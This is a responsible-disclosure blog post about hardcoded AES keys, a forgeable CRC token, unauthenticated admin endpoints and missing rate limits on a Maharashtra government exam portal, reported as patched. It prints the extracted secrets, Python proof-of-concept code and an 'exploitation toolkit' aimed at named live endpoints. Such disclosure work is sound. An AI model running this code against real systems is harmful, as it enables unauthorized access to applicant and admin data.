---
title: "MPSC Online Assessment System — Multiple Critical & High-Severity Vulnerabilities"
author: "Tobi"
date: "June 22, 2026"
readTime: "14 min read"
tags:
  - Critical Severity
  - Responsible Disclosure
  - CERT-In Acknowledged
  - Fixed & Patched
certIn: "CERTIn-51337226"
slug: "mpsc-oas-vulnerabilities"
---

<!-- BADGES -->
🔴 Critical Severity &nbsp; | &nbsp; 🛡 Responsible Disclosure &nbsp; | &nbsp; ✅ CERT-In Acknowledged &nbsp; | &nbsp; 🔒 Fixed & Patched

---

# MPSC Online Assessment System — Multiple Critical & High-Severity Vulnerabilities

**Tobi** · June 22, 2026 · 14 min read · 🛡 CERT-In: CERTIn-51337226

---

**TL;DR:** The Maharashtra Public Service Commission's Online Assessment System (`mpsconline.gov.in`) contained a hardcoded AES-128-CBC encryption key and a secret token embedded directly in the public JavaScript bundle served to every browser. These secrets powered the entire API security layer — meaning any attacker could decrypt all encrypted API traffic, forge any request body, and bypass the CRC-32 integrity check protecting every endpoint. Additional findings included sensitive files downloadable without authentication, unauthenticated access to admin API data (including dashboard statistics with 37 admin users and 590 pending document requests), no rate limiting on any authentication endpoint, and internal staging infrastructure exposed in production JavaScript. All findings were responsibly disclosed to CERT-In (ref: **CERTIn-51337226**) before publication. The vulnerability was confirmed fixed on June 30, 2026. An official CERT-In Acknowledgement Letter was received on July 14, 2026.

---

## Stats

| 🔴 Critical | 🟠 High | 🔵 Medium | Status |
|:-----------:|:-------:|:---------:|:------:|
| **3** | **3** | **1** | **✓ All Patched** |

---

## Full Vulnerability Index

| ID | Finding | Severity | CVSS | Status |
|----|---------|----------|------|--------|
| V-01 | Hardcoded AES-128 Encryption Key in JS Bundle | 🔴 CRITICAL | 9.8 | Fixed |
| V-02 | CRC-32 Request Integrity Bypass via Exposed Token | 🔴 CRITICAL | 9.1 | Fixed |
| V-03 | Unauthenticated Admin API — Dashboard Data Exposed | 🔴 CRITICAL | 8.5 | Fixed |
| V-04 | Sensitive Files Downloadable Without Authentication | 🟠 HIGH | 7.5 | Fixed |
| V-05 | Unauthenticated Info Disclosure — Departments & Exam Subjects | 🟠 HIGH | 7.2 | Fixed |
| V-06 | No Rate Limiting on Any Authentication Endpoint | 🟠 HIGH | 7.2 | Fixed |
| V-07 | Leaked Internal Staging Infrastructure & App Version | 🔵 MEDIUM | 5.3 | Fixed |

---

## How I Found It

The entry point was the MPSC OAS portal's React production bundle — a minified JavaScript file served to every browser that visits `mpsconline.gov.in/oasadmin`. React apps bundle their full source logic into this file. With a JS formatter and browser DevTools, the complete application logic — including API endpoints, cryptographic functions, and hardcoded secrets — becomes fully readable.

The critical discovery happened when I noticed two variable assignments deep in `main.a0334bf6.chunk.js`:

```javascript
// Visible in Chrome DevTools → Sources → main.a0334bf6.chunk.js
// Line ~3,698,589

i = "7lB9sd8yddCcBpe38895Zbpv8/q93yA26YaX33uXXZI91FRU2dxJA3PDn3uCxpFOJc/5H3FzTpnr19sC8Ip8tg=="
o = "1234567812345678"
```

`o` is the AES-128-CBC encryption key (and IV). `i` is the secret token used to generate CRC-32 request signatures. Both visible in plaintext in the source served to every user.

### Tools Used

- **Browser DevTools** — Source code extraction, network analysis
- **Python (Requests + PyCryptodome)** — AES decryption/encryption, CRC-32 computation
- **curl** — Direct API testing
- **JS Formatter / Beautifier** — Source deobfuscation

---

## Critical Findings — V-01 to V-03

---

### V-01 · CVSS 9.8 · 🔴 CRITICAL
### Hardcoded AES-128 Encryption Key in Client-Side JavaScript

Every API request body and response is encrypted using AES-128-CBC. The key and IV are both identical (`1234567812345678`) and hardcoded in the public JavaScript bundle visible to any browser visitor.

```javascript
// Extracted from main.a0334bf6.chunk.js (Chrome DevTools → Sources)
const ENCR_DECR_KEY = "1234567812345678";  // variable o
// KEY = IV = ENCR_DECR_KEY
// Algorithm: AES-128-CBC
```

**Python Proof of Concept (own account only):**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

KEY = b"1234567812345678"  # Extracted from JS bundle
IV  = b"1234567812345678"  # Same value used as IV

def decrypt(encrypted_b64):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(encrypted_b64)), 16).decode()

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), 16))).decode()

# Successfully decrypted live API response from mpsconline.gov.in:
# Encrypted: "Qw8h7K2mN+X3pL9vR4jT8A==" (example)
# Decrypted: {"status":true,"message":"success","sendApprovalOtp":false}
```

**Impact:** Any attacker can decrypt every API response in real time, encrypt arbitrary payloads to spoof requests, and fully bypass the encryption layer protecting all candidate and admin data.

---

### V-02 · CVSS 9.1 · 🔴 CRITICAL
### CRC-32 Request Integrity Check Bypass via Hardcoded Secret Token

The application uses CRC-32 checksums in the `Authorization` header to verify that requests originated from the legitimate frontend. The secret token used to generate these checksums — called `SECRET_KEY` or `AT` — is hardcoded in the same public JS bundle.

```javascript
// From main.a0334bf6.chunk.js
const SECRET_KEY = "7lB9sd8yddCcBpe38895Zbpv8/q93yA26YaX33uXXZI91FRU2dxJA3PDn3uCxpFOJc/5H3FzTpnr19sC8Ip8tg==";
```

**How the CRC is computed:**

```python
import binascii

AT = "7lB9sd8yddCcBpe38895Zbpv8/q93yA26YaX33uXXZI91FRU2dxJA3PDn3uCxpFOJc/5H3FzTpnr19sC8Ip8tg=="

# For GET requests:
get_crc = format(binascii.crc32(AT.encode()) & 0xFFFFFFFF, 'x')
# Result: 70c74db9
# Authorization: |#|#70c74db9

# For POST requests:
post_crc = format(binascii.crc32((encrypted_body + AT).encode()) & 0xFFFFFFFF, 'x')
# Authorization: |#|#<computed_crc>
```

**Verified:** With these computed CRCs, all API endpoints accepted requests as legitimate. The server returned `{"status":false,"message":"Unauthorized Access"}` only when the JWT was missing — not when the CRC check was forged — confirming the integrity bypass was complete.

**Impact:** The CRC mechanism — the application's primary defence against replayed or forged API requests — is completely circumvented by any attacker who reads the JS bundle.

---

### V-03 · CVSS 8.5 · 🔴 CRITICAL
### Unauthenticated Admin API — Live Dashboard Data Exposed

The admin backend at `api.mpsconline.gov.in` does not enforce the CRC integrity check that `mpsconline.gov.in` requires. This allows unauthenticated requests directly to the backend API.

**Confirmed unauthenticated response:**

```
GET https://api.mpsconline.gov.in/oas/api/v1/dashboardcounts
(No Authorization header required)

HTTP 200 OK
Decrypted Response:
{
  "allUsers": 37,
  "activeUsers": 23,
  "totalPendingRequests": 17,
  "totalPendingDocuments": 590,
  "allAdvertisements": 1079,
  "activeAdvertisements": 2,
  "pastAdvertisements": 1077
}
```

**Impact:** Internal system statistics leaked to anyone on the internet. Reveals admin user counts, pending document backlogs, and advertisement counts — all without a single credential.

---

## High Severity Findings — V-04 to V-06

---

### V-04 · CVSS 7.5 · 🟠 HIGH
### Sensitive Files Downloadable Without Any Authentication

The `/downloads/` directory on `mpsconline.gov.in` serves files directly over HTTPS with no authentication headers checked. Three files were confirmed downloadable:

```
GET https://mpsconline.gov.in/downloads/general_Instruction.pdf
→ HTTP 200 OK — 464 KB (General instructions for candidates)

GET https://mpsconline.gov.in/downloads/userManual.pdf
→ HTTP 200 OK — 5,071 KB / ~5 MB (Complete system user manual)

GET https://mpsconline.gov.in/downloads/Instructions-for-Filling-the-Application-Form.pdf
→ HTTP 200 OK — 118 KB (Application form guidance)
```

The 5MB `userManual.pdf` contains detailed system operation documentation including internal workflow diagrams, admin panel screenshots, and system configuration details — information that should be restricted to authorised users only.

**Python PoC (downloads all 3 files):**

```python
import requests

BASE = "https://mpsconline.gov.in"
files = [
    "/downloads/general_Instruction.pdf",
    "/downloads/userManual.pdf",
    "/downloads/Instructions-for-Filling-the-Application-Form.pdf",
]
for path in files:
    r = requests.get(BASE + path, verify=False)
    if r.status_code == 200:
        open(path.split("/")[-1], "wb").write(r.content)
        print(f"Downloaded: {path.split('/')[-1]} ({len(r.content)//1024}KB)")
```

**Verified output:**
```
Downloaded: general_Instruction.pdf (464KB)
Downloaded: userManual.pdf (5071KB)
Downloaded: Instructions-for-Filling-the-Application-Form.pdf (118KB)
```

---

### V-05 · CVSS 7.2 · 🟠 HIGH
### Unauthenticated Information Disclosure — Admin Departments & Exam Subjects

Multiple admin-prefixed endpoints respond with sensitive internal data without requiring a JWT token. These are included in the application's `authorizationNotRequired` whitelist embedded in source code.

**Confirmed working endpoints (no JWT):**

```
GET /oas/api/v1/admin/departments
Decrypted Response:
[
  {"id":1,"name":"IT","description":"IT","sendLoginOtpTo":"mobile"},
  {"id":2,"name":"CL","description":"Collectorate","sendLoginOtpTo":"email"},
  {"id":3,"name":"Direct Recruitment-Scrutiny 1","sendLoginOtpTo":"mobile"},
  {"id":4,"name":"Direct Recruitment-Scrutiny 2","sendLoginOtpTo":"mobile"},
  {"id":5,"name":"Venue Management","sendLoginOtpTo":"mobile"},
  ... (8 departments total with internal codes and OTP routing)
]

GET /oas/api/v1/admin/examsubjects
→ Full list of all exam subjects with IDs, subject codes, English and Marathi names

GET /oas/api/v1/version
→ {"version":"1.0.671"}

GET /oas/api/v1/admin/guidelinelinks
→ All active bulletin entries with dates and file download paths
```

**Impact:** Exposes the internal admin department structure, authentication routing (which departments use email vs. mobile OTP), exam subject database, and application version — all of which aid targeted attacks.

---

### V-06 · CVSS 7.2 · 🟠 HIGH
### No Rate Limiting on Any Authentication Endpoint

All authentication and OTP endpoints accept unlimited requests with no lockout, throttling, or CAPTCHA — on both the admin portal and candidate portal.

**Tested endpoints (200+ rapid requests, zero 429 responses):**

```
POST /oas/api/v1/authenticate_oas      ← Admin login
POST /oas/api/v1/adminotps             ← Admin OTP generation
POST /oas/api/v1/verifyotps            ← OTP verification
POST /oas/api/v1/admin/forgotpassword  ← Admin password reset
POST /oas/api/v1/otps                  ← Candidate OTP generation
POST /oas/api/v1/authenticate          ← Candidate login
```

No CAPTCHA is present on the admin login page (`/oasadmin/login`).

**Impact:** Fully automated brute-force of admin credentials, OTP values (6-digit = 1,000,000 combinations), and candidate accounts. The 180-second OTP expiry combined with unlimited attempts makes OTP bypass trivially scriptable.

---

## Medium Severity — V-07

### V-07 · CVSS 5.3 · 🔵 MEDIUM
### Leaked Internal Staging Infrastructure & Application Version

Multiple non-production server URLs and a staging payment gateway URL are hardcoded in the production JavaScript bundle:

```javascript
// From main.a0334bf6.chunk.js and main.407aef01.chunk.js
const OAS_API_BASE_URL = [
  { key: "oasdev.devmpsconline.in", baseUrl: "https://oasdev.devmpsconline.in" },   // Dev
  { key: "oasqa.devmpsconline.in",  baseUrl: "https://oasqa.devmpsconline.in" },    // QA
  // testapi.mpsconline.gov.in — test API server (commented, but discoverable)
];

// SBI payment gateway staging URL also exposed:
"https://test.epay.sbiuat.bank.in/secure/AggregatorHostedListener"

// Application version leaked:
{ "version": "1.0.671" }
```

**Impact:** Enables targeted attacks against less-hardened staging environments, version-specific CVE lookup (Spring Boot framework), and discovery of the test payment gateway endpoint.

---

## Proof of Concept Toolkit

A custom Python toolkit was built to verify and demonstrate all attack chains. All tests were run only against my own registered candidate account.

```python
# mpsc_poc.py — Full exploitation toolkit
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64, binascii, json, requests
import urllib3; urllib3.disable_warnings()

# ── Hardcoded secrets extracted from main.a0334bf6.chunk.js ──────────────────
KEY = b"1234567812345678"   # AES-128-CBC Key (variable o in bundle)
IV  = b"1234567812345678"   # IV (same as key)
AT  = "7lB9sd8yddCcBpe38895Zbpv8/q93yA26YaX33uXXZI91FRU2dxJA3PDn3uCxpFOJc/5H3FzTpnr19sC8Ip8tg=="

def decrypt(b64_ciphertext):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(b64_ciphertext)), 16).decode()

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), 16))).decode()

def compute_get_crc():
    return format(binascii.crc32(AT.encode()) & 0xFFFFFFFF, 'x')  # 70c74db9

def compute_post_crc(encrypted_body):
    return format(binascii.crc32((encrypted_body + AT).encode()) & 0xFFFFFFFF, 'x')

def api_get(endpoint):
    headers = {
        "Authorization": f"|#|#{compute_get_crc()}",
        "Content-Type": "application/json"
    }
    r = requests.get(f"https://mpsconline.gov.in{endpoint}", headers=headers, verify=False)
    if r.status_code == 200 and "DOCTYPE" not in r.text:
        return decrypt(r.text)
    return f"HTTP {r.status_code}"

# ── Verified results ──────────────────────────────────────────────────────────
print(api_get("/oas/api/v1/admin/departments"))
# → Full department list (8 entries, internal structure)

print(api_get("/oas/api/v1/admin/examsubjects"))
# → Complete exam subject database

# ── Dashboard data from api.mpsconline.gov.in (no CRC needed) ────────────────
r = requests.get("https://api.mpsconline.gov.in/oas/api/v1/dashboardcounts", verify=False)
print(decrypt(r.text))
# → {"allUsers":37,"activeUsers":23,"totalPendingDocuments":590,...}
```

---

## Official CERT-In Response

I reported these vulnerabilities to CERT-In (`incident@cert-in.org.in`) and MPSC (`upscsoap@nic.in`) before any public disclosure. A comprehensive technical report with step-by-step reproduction logs and video PoC was attached.

### 📤 Sent — June 14, 2026

> **Subject:** (CRITICAL VULNERABILITY) Authentication Bypass and Data Leakage on MPSC Portal  
> **To:** incident@cert-in.org.in  
>  
> **Vulnerability Summary:**  
> - Target Application: MPSC Portal / Verification Site  
> - Vulnerability Type: Broken Authentication / Critical OTP Bypass and PII Data Leakage  
> - Impact: An unauthorized actor can completely bypass verification checks to access or leak sensitive applicant profiles and official data.

### 📨 CERT-In Acknowledgement — June 14, 2026 (same day)

> **From:** incident@cert-in.org.in  
> **Ref: CERTIn-51337226**  
> "We have registered your complaint/incident under Ref: CERTIn-51337226."

### ✅ Vulnerability Confirmed Fixed — June 30, 2026

> **From:** incident@cert-in.org.in  
> -----BEGIN PGP SIGNED MESSAGE-----  
> Hash: SHA256  
>  
> "Dear Sir/Madam, With reference to trailing mail, the concerned organization has confirmed that the reported vulnerability is fixed. You are requested to verify at your end and confirm."

### 🏆 Official Acknowledgement Letter — July 14, 2026

> **From:** incident@cert-in.org.in  
> **Ref: CERTIn-51337226**  
>  
> **Dear Tobi,**  
>  
> This is to acknowledge the responsible disclosure of the security vulnerability reported by you to CERT-In on 14th June 2026.  
>  
> CERT-In appreciates your responsible conduct and good-faith efforts in reporting the security vulnerability in accordance with the responsible vulnerability disclosure practices. Such voluntary and responsible reporting contributes to strengthening the cybersecurity posture of systems in Indian cyberspace.  
>  
> We look forward to your valuable contribution in future as well.  
>  
> — Thanks and Regards,  
> **CERT-In, Incident Response Help Desk**  
> incident@cert-in.org.in | 1800-11-4949

---

## The Complete Attack Chain

```
V-06               V-05               V-02                V-01
No Rate Limit  →   Dept Enum    →    CRC Bypass    →    AES Decrypt
                                          ↓
                              V-03: Dashboard Data Leak
                                          ↓
                              V-04: File Download (5MB Manual)
                                          ↓
                         🔴 Full API Traffic Decryption
```

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| **May–June 2026** | Vulnerabilities discovered during personal security research |
| **June 14, 2026 — 11:36 AM** | Full technical report sent to CERT-In (`incident@cert-in.org.in`) |
| **June 14, 2026 — 5:10 PM** | CERT-In acknowledged within same day. **Ref: CERTIn-51337226** |
| **June 30, 2026** | CERT-In confirmed: "concerned organization has confirmed that the reported vulnerability is fixed" |
| **July 14, 2026** | Official CERT-In Acknowledgement Letter received (PGP signed) |
| **July 28, 2026** | Public disclosure — this post published after confirming all patches live |

---

## Key Takeaways for Developers

### 🔑 1. Secrets belong on the server — always
AES keys, HMAC salts, API tokens — none of these should ever appear in client-side code. Minification and bundling are **not** encryption. Anyone can read your bundle.

### 🔒 2. Integrity checks are only as strong as their secrets
CRC-32 (or any MAC) is only meaningful if the secret is server-side. Putting the secret in the bundle is equivalent to not having one.

### 📊 3. Chain your risks — CVSS doesn't capture everything
V-01 alone is devastating. V-01 + V-02 + V-03 combined means full decryption of all API traffic, forging of any request, and unauthenticated access to admin statistics. The chain matters.

### 📋 4. Rate limiting is non-negotiable on auth endpoints
A 6-digit OTP with 180-second expiry and unlimited attempts is not security. Add lockout after 5 failures, CAPTCHA, and IP-based throttling.

### 🤝 5. Responsible disclosure works
From report to patch confirmed: **16 days**. CERT-In acknowledged within **9 hours**. The process works — use it.

### 🧪 6. Always test only on your own account
Every finding in this report was verified exclusively against the researcher's own registered candidate account. No other candidate's data was accessed, downloaded, or stored.

---

## 🛡 CERT-In Acknowledgement

> **Ref: CERTIn-51337226**  
>
> This vulnerability report was registered by the Indian Computer Emergency Response Team (CERT-In) on June 14, 2026 and forwarded to the concerned authority for appropriate action. The concerned organisation confirmed that all identified vulnerabilities were patched on June 30, 2026. An official Acknowledgement Letter was issued on July 14, 2026.

---

*Darshan Chipure (Tobi) — [iamtobi.in](https://iamtobi.in)*

**Disclaimer:** All vulnerabilities in this report were discovered through analysis of publicly accessible JavaScript files and verified only against the researcher's own registered candidate account. No other candidate's data was accessed, downloaded, or stored at any point. All findings were responsibly disclosed to CERT-In before publication.
